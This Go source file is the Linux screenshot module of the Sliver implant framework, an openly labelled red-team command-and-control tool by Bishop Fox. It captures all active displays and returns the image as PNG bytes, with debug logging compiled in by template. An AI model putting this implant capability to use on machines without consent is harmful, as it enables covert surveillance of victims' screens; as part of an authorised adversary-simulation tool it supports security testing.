package screen

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"image/png"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	screen "github.com/kbinani/screenshot"
)

//Screenshot - Retrieve the screenshot of the active displays
func Screenshot() []byte {
	return LinuxCapture()
}

// LinuxCapture - Retrieve the screenshot of the active displays
func LinuxCapture() []byte {
	nDisplays := screen.NumActiveDisplays()

	var height, width int = 0, 0
	for i := 0; i < nDisplays; i++ {
		rect := screen.GetDisplayBounds(i)
		if rect.Dy() > height {
			height = rect.Dy()
		}
		width += rect.Dx()
	}
	img, err := screen.Capture(0, 0, width, height)

	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("Error Capture: %s", err)
		//{{end}}
	}

	var buf bytes.Buffer
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("Capture Error")
		//{{end}}
		return buf.Bytes()
	}

	png.Encode(&buf, img)
	return buf.Bytes()
}
